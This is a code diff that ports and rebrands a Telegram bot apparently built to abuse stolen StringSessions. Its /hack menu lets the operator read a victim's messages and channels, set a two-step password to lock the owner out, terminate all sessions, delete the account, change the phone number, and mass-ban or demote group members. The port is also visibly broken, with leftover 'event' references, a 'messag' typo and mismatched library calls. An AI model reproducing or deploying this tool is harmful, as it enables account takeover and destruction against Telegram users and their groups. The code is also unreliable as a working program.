@@ -183,30 +183,30 @@ Take his StringSession and use me
 I will give you full power of mine
 Type /hack
 '''
-@Client.on_message(filters.NewMessage(pattern="/start"))
-async def op(event):
-  global mm
-  if not event.is_private:
-    await event.reply("please use me in pm🥺")
+@Client.on_message(filters.command("start"))
+async def op(client, message):
+  if message.chat.type != "private":
+    await message.reply("please use me in pm🥺")
   else:
-    await event.reply(mm)
-@pyrogram.Client.on_message(events.NewMessage(pattern="/give"))
-async def op(event):
-  if not event.sender_id == legendx:
-    return await event.reply("please don't use me fuck off 🥺")
+    await message.reply(mm)
+
+@Client.on_message(filters.command("give"))
+async def op(client, message):
+  if not message.sender_id == hekur:
+    return await message.reply("please don't use me fuck off 🥺")
   try:
-    await event.reply("session bot file", file="Xarmy.session")
+    await message.reply("session bot file", file="hekur.session")
   except Exception as e:
     print (e)
 
 
-@pyrogram.Client.on_message(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
-async def op(event):
-  await event.reply("please use me in pm🥺")
-@pyrogram.Client.on_message(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
-async def start(event):
+@Client.on_message(filters.command("hack", func=lambda x: x.is_group))
+async def op(client, message):
+  await message.reply("please use me in pm🥺")
+@Client.on_message(filters.command("hack", func = lambda x: x.is_private))
+async def start(client, message):
   global menu
-  async with bot.conversation(event.chat_id) as x:
+  async with bot.conversation(messag.chat_id) as x:
     await x.send_message(f"Choose what you want with string session \n\n{menu}")
     res = await x.get_response()
     r = res.text
@@ -217,19 +217,19 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await message.respond("This StringSession is terminated maybe")
       try:
         i = await userchannels(strses.text)
       except:
-        return await event.reply("This StringSession is terminated maybe")
+        return await message.reply("This StringSession is terminated maybe")
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDETAILS BY X ARMY")
+        file.write(i + "\n\nDETAILS BY HEKURMAN")
         file.close()
-        await bot.send_file(event.chat_id, "session.txt")
+        await bot.send_file(message.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nThanks For using X Army Bot")
+        await message.reply(i + "\n\nThanks For using Hekurs Bot")
     elif res.text == "B":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -237,9 +237,9 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await message.respond("This StringSession is terminated maybe")
       i = await userinfo(strses.text)
-      await event.reply(i + "\n\nThanks For using X Army Bot")
+      await message.reply(i + "\n\nThanks For using X Army Bot")
     elif r == "C":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -247,11 +247,11 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await message.respond("This StringSession is terminated maybe")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await userbans(strses.text, grpid.text)
-      await event.reply("Banning all members Thanks For using X Army Bot")
+      await event.reply("Banning all members Thanks For using hekurman")
     elif r == "D":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -259,9 +259,9 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await message.respond("This StringSession is terminated maybe")
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For using X Army Bot")
+      await message.reply(i + "\n\nThanks For using X Army Bot")
     elif r == "E":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -269,11 +269,11 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await message.respond("This StringSession is terminated maybe")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await joingroup(strses.text, grpid.text)
-      await event.reply("Joined the Channel/Group Thanks For using X Army Bot")
+      await message.reply("Joined the Channel/Group Thanks For using hekurman")
     elif r == "F":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -281,11 +281,11 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await message.respond("This StringSession is terminated maybe")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await leavegroup(strses.text, grpid.text)
-      await event.reply("Leaved the Channel/Group Thanks For using X Army Bot")
+      await message.reply("Leaved the Channel/Group Thanks For using X Army Bot")
     elif r == "G":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -293,11 +293,11 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await message.respond("This StringSession is terminated maybe")
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("Deleted the Channel/Group Thanks For using X Army Bot")
+      await message.reply("Deleted the Channel/Group Thanks For using hekurman")
     elif r == "H":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -305,12 +305,12 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await message.respond("This StringSession is terminated maybe")
       i = await user2fa(strses.text)
       if i:
-        await event.reply("User don't have two step thats why now two step is `LEGENDXISBEST` you can login now\n\nThanks For using X Army Bot")
+        await message.reply("User don't have two step thats why now two step is `LEGENDXISBEST` you can login now\n\nThanks For using X Army Bot")
       else:
-        await event.reply("Sorry User Have two step already")
+        await message.reply("Sorry User Have two step already")
     elif r == "I":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -318,9 +318,9 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await message.respond("This StringSession is terminated maybe")
       i = await terminate(strses.text)
-      await event.reply("The all sessions are terminated\n\nThanks For using X Army Bot")
+      await message.reply("The all sessions are terminated\n\nThanks For using hekurman")
     elif res.text == "J":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -328,9 +328,9 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await message.respond("This StringSession is terminated maybe")
       i = await delacc(strses.text)
-      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using X Army Bot")
+      await message.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using hekurman")
     elif res.text == "L":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -338,13 +338,13 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await message.respond("This StringSession is terminated maybe")
       await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
       grp = await x.get_response()
       await x.send_message("NOW GIVE USER USERNAME")
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
-      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using X Army Bot")
+      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using hekurman")
     elif res.text == "K":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -352,14 +352,14 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await message.respond("This StringSession is terminated maybe")
       await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
       pro = await x.get_response()
       try:
         i = await demall(strses.text, pro.text)
       except:
         pass
-      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using X Army Bot")
+      await message.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using X Army Bot")
     elif res.text == "M":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -367,12 +367,12 @@ async def start(event):
       if op:
         pass
       else:
-        return await event.respond("This StringSession is terminated maybe")
+        return await message.respond("This StringSession is terminated maybe")
       await x.send_message("GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] ")
       number = (await x.get_response()).text
       try:
         result = await change_number(strses.text, number)
-        await event.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
+        await message.respond(result + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp")
         await asyncio.sleep(20)
         await x.send_message("NOW GIVE PHONE CODE HASH")
         phone_code_hash = (await x.get_response()).text
@@ -380,14 +380,14 @@ async def start(event):
         otp = (await x.get_response()).text
         changing = await change_number_code(strses.text, number, phone_code_hash, otp)
         if changing:
-          await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
+          await message.respond("CONGRATULATIONS NUMBER WAS CHANGED")
         else:
-          await event.respond("Something is wrong")
+          await message.respond("Something is wrong")
       except Exception as e:
-        await event.respond("SEND THIS ERROR TO - @sessionhack_chat\n**LOGS**\n" + str(e))
+        await message.respond("SEND THIS ERROR TO - @hekurman\n**LOGS**\n" + str(e))
 
     else:
-      await event.respond("Wrong Text Found Re type /hack and use")
+      await message.respond("Wrong Text Found Re type /hack and use")
 
 
 
